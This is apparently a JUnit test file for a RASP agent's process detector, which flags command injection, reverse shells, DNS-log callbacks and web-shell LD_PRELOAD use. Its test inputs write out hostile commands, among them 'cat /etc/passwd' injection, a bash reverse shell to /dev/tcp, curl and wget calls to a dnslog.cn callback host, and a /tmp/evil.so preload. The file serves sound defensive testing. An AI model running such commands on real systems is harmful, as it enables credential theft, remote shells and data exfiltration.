package io.ohmyrasp.agent.detect;

import static io.ohmyrasp.agent.detect.DetectorTestSupport.assertAlgorithm;
import static io.ohmyrasp.agent.detect.DetectorTestSupport.request;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import io.ohmyrasp.agent.model.RequestContext;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/** ProcessDetector: Process launches, shell commands and dynamic-loader environment variables. */
final class ProcessDetectorTest {
  @Test
  void checksOnlyTheSelectedWindowsInlineProgram() {
    String label = "O'Brien & Sons";
    var input = request(Map.of("label", List.of(label)));
    assertTrue(ProcessDetector.detectCommand(List.of("java.exe", "Report", label), input).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("powershell.exe", "-File", "report.ps1", label), input).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("pwsh", "-cwa", "Write-Output $args[0]", label), input).isEmpty());
    String program = "Write-Output weekly; Write-Output ready";
    assertTrue(ProcessDetector.detectCommand(List.of("pwsh", "-Command", program), request(Map.of("label", List.of("weekly")))).isEmpty());
    assertAlgorithm(ProcessDetector.detectCommand(List.of("pwsh", "-NoProfile", "-NonInteractive", "-Command", program),
        request(Map.of("program", List.of(program)))), "command_userinput");
    String afterComment = "<# report | template #> Write-Output weekly; Write-Output ready";
    assertAlgorithm(ProcessDetector.detectCommand(List.of("pwsh", "-c", afterComment),
        request(Map.of("program", List.of("weekly; Write-Output")))), "command_userinput");
    assertTrue(ProcessDetector.detectCommand(List.of("pwsh", "-c", afterComment),
        request(Map.of("description", List.of("report | template")))).isEmpty());
    assertAlgorithm(ProcessDetector.detectCommand(List.of("pwsh", "-Command", "Write-Output item#tag; Write-Output ready"),
        request(Map.of("program", List.of("tag; Write-Output")))), "command_userinput");
    String literal = "Write-Output 'Sales & Reports'";
    assertTrue(ProcessDetector.detectCommand(List.of("pwsh", "-Command", literal), request(Map.of("label", List.of(literal)))).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("cmd", "/d", "/c", "echo", "Sales & Reports"),
        request(Map.of("label", List.of("Sales & Reports")))).isEmpty());
  }

  @Test
  void detectsCommandUserInput() {
    var result =
        ProcessDetector.detectCommand(
            List.of("sh", "-c", "echo ok; cat /etc/passwd"),
            request(Map.of("cmd", List.of("cat /etc/passwd"))));

    assertTrue(result.isPresent());
    assertEquals("command_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void separatesShellSourceFromProcessArguments() {
    var input = request(Map.of("text", List.of("sales|sh", "O'Brien")));
    assertTrue(ProcessDetector.detectCommand(List.of("printf", "%s", "sales|sh"), input).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("sh", "-c", "printf '%s' \"$1\"", "--", "O'Brien"), input).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("sh", "-c", "printf '%s' 'sales|sh'; printf done"), input).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("sh", "-c", "printf ok | cat"), request()).isEmpty());
    assertAlgorithm(ProcessDetector.detectCommand(List.of("/usr/bin/env", "LC_ALL=C", "/bin/sh", "-lc",
        "printf ok; date"), request(Map.of("job", List.of("date")))), "command_userinput");
  }

  @Test
  void checksFileReaderOperandsAtLaunch() {
    assertAlgorithm(ProcessDetector.detectCommand(List.of("/bin/cat", "--", "/etc/passwd"), request()), "command_common");
    assertTrue(ProcessDetector.detectCommand(List.of("cat", "/etc/passwd.example"), request()).isEmpty());
    assertTrue(ProcessDetector.detectCommand(List.of("cat", "--help", "/etc/passwd"), request()).isEmpty());
    assertAlgorithm(ProcessDetector.detectCommand(List.of("/usr/bin/env", "LC_ALL=C", "sh", "-c", "cat /etc/passwd"),
        request()), "command_common");
  }

  @Test
  void literalOutputDoesNotExemptOtherShellOperations() {
    for (String program : List.of("printf '%s' weekly\ncat /etc/passwd", "REPORT=/bin/echo cat /etc/passwd",
        "printf %s weekly; cat /etc/passwd", "eval 'cat /etc/passwd' # report")) {
      assertAlgorithm(ProcessDetector.detectCommand(List.of("sh", "-c", program), request()), "command_common");
    }
    for (String program : List.of("echo 'guide: cat /etc/passwd'", "printf 'percent %% [%8.3s]' 'cat /etc/passwd'")) {
      assertTrue(ProcessDetector.detectCommand(List.of("sh", "-c", program), request()).isEmpty(), program);
    }
    assertAlgorithm(ProcessDetector.detectCommand(List.of("sh", "-c", "/bin/cat -- '/etc/'passwd"), request()), "command_common");
  }

  @Test
  void detectsCommonDangerousCommand() {
    var result = ProcessDetector.detectCommand(List.of("bash", "-i", ">&", "/dev/tcp/127.0.0.1/4444"), request());

    assertTrue(result.isPresent());
    assertEquals("command_common", result.orElseThrow().algorithm());
  }

  @Test
  void detectsReflectiveCommandStack() {
    var args = List.of("id");
    var direct = List.of("java.lang.ProcessImpl", "java.lang.ProcessBuilder", "java.lang.reflect.Method");
    assertTrue(ProcessDetector.detectCommand(args, request(), direct).isEmpty());
    assertTrue(ProcessDetector.detectCommand(args, request(), direct, true).orElseThrow().requiresExplicitRule());
    var caller = List.of("java.lang.ProcessImpl", "java.lang.ProcessBuilder", "example.Report",
        "java.lang.reflect.Method");
    assertTrue(ProcessDetector.detectCommand(args, request(), caller, true).isEmpty());
    var result =
        ProcessDetector.detectCommand(
            List.of("id"), request(), List.of("java.lang.reflect.Method", "example.Shell"), true);

    assertAlgorithm(result, "command_reflect");
  }

  @Test
  void detectsSpringExpressionCommandStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("id"),
            request(),
            List.of(
                "org.springframework.expression.spel.ast.MethodReference",
                "org.springframework.expression.spel.standard.SpelExpression"));

    assertAlgorithm(result, "spel_runtime");
  }

  @Test
  void detectsGroovyCommandStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("id"),
            request(),
            List.of("org.codehaus.groovy.runtime.ProcessGroovyMethods"));

    assertAlgorithm(result, "script_runtime");
  }

  @Test
  void detectsGremlinGroovyCommandStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("id"),
            request(),
            List.of("org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine"));

    assertAlgorithm(result, "script_runtime");
  }

  @Test
  void unrelatedExecutableListenerCanRunAnOrdinaryReportCommand() {
    for (String owner : List.of("example.reports.RunExecutableListener", "example.Jobs$RunExecutableListener")) {
      assertTrue(ProcessDetector.detectCommand(List.of("/usr/bin/printf", "weekly"), request(), List.of(owner)).isEmpty());
    }
  }

  @Test
  void detectsSolrCve201712629ConfiguredExecutableListenerCommandStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("sh", "-c", "touch /tmp/success"),
            request(),
            List.of("org.apache.solr.core.RunExecutableListener"));

    assertAlgorithm(result, "command_config_listener");
    assertEquals(
        "org.apache.solr.core.RunExecutableListener",
        result.orElseThrow().details().get("listener"));
  }

  @Test
  void detectsRocketMqCve202333246RuntimeConfigCommandLauncherStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("sh", "-c", "touch /tmp/success"),
            RequestContext.empty(),
            List.of(
                "java.lang.Runtime",
                "org.apache.rocketmq.broker.filtersrv.FilterServerUtil",
                "org.apache.rocketmq.broker.filtersrv.FilterServerManager"));

    assertAlgorithm(result, "command_config_injection");
    assertEquals(
        "org.apache.rocketmq.broker.filtersrv.FilterServerManager",
        result.orElseThrow().details().get("launcher"));
  }

  @Test
  void detectsRhinoJavascriptCommandStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("sh", "-c", "id"),
            request(),
            List.of(
                "org.mozilla.javascript.NativeJavaMethod",
                "org.mozilla.javascript.Context"));

    assertAlgorithm(result, "javascript_runtime");
  }

  @Test
  void detectsTemplateCommandStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("id"),
            request(),
            List.of("freemarker.template.utility.Execute"));

    assertAlgorithm(result, "template_runtime");
  }

  @Test
  void ignoresPlainLowSignalCommandWithoutRuntimeStack() {
    var result = ProcessDetector.detectCommand(List.of("id"), request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresLowSignalTouchCommandWithoutExecutableListenerStack() {
    var result = ProcessDetector.detectCommand(List.of("sh", "-c", "touch /tmp/success"), request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresLowSignalTouchWithOrdinarySchedulerStack() {
    var result =
        ProcessDetector.detectCommand(
            List.of("sh", "-c", "touch /tmp/success"),
            RequestContext.empty(),
            List.of("java.util.concurrent.ScheduledThreadPoolExecutor"));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsCommandSyntaxError() {
    var result = ProcessDetector.detectCommand(List.of("sh", "-c", "echo 'unterminated"), request());

    assertAlgorithm(result, "command_error");
  }

  @Test
  void detectsDnslogCommand() {
    for (var argv : List.of(
        List.of("curl", "http://abc.dnslog.cn/a"),
        List.of("curl", "-fsSL", "-o", "report", "--url", "https://ABC.DNSLOG.CN./a"),
        List.of("wget", "-O", "report", "https://reports.invalid", "abc.dnslog.cn/a"),
        List.of("ping", "abc.dnslog.cn."), List.of("nslookup", "abc.dnslog.cn"),
        List.of("dig", "abc.dnslog.cn"))) {
      var result = ProcessDetector.detectCommand(argv, request());
      assertAlgorithm(result, "command_dnslog");
      assertEquals("abc.dnslog.cn", result.orElseThrow().details().get("host"));
    }
  }

  @Test
  void ignoresCallbackTextOutsideDestinationOperands() {
    for (var argv : List.of(
        List.of("printf", "%s", "curl http://abc.dnslog.cn/a"),
        List.of("curl", "https://notdnslog.cn/"),
        List.of("curl", "https://abc.dnslog.cn.example.test/"),
        List.of("curl", "http://abc.dnslog.cn@reports.invalid/"),
        List.of("curl", "https://reports.invalid/?guide=dnslog.cn"),
        List.of("curl", "-d", "abc.dnslog.cn", "https://reports.invalid/"),
        List.of("wget", "-O", "abc.dnslog.cn", "https://reports.invalid/"),
        List.of("curl", "https://abc.dnslog.cn/", "--version"),
        List.of("dig", "-f", "abc.dnslog.cn"))) {
      assertTrue(ProcessDetector.detectCommand(argv, request()).isEmpty(), argv.toString());
    }
  }

  @Test
  void detectsWebshellCommand() {
    var result =
        ProcessDetector.detectWebshellCommand(
            List.of("sh", "-c", "id"), request(Map.of("cmd", List.of("sh -c id"))));

    assertAlgorithm(result, "webshell_command");
  }

  @Test
  void detectsWebshellLdPreload() {
    var result = ProcessDetector.detectWebshellLdPreload("LD_PRELOAD", "/tmp/evil.so", request());

    assertAlgorithm(result, "webshell_ld_preload");
  }
}
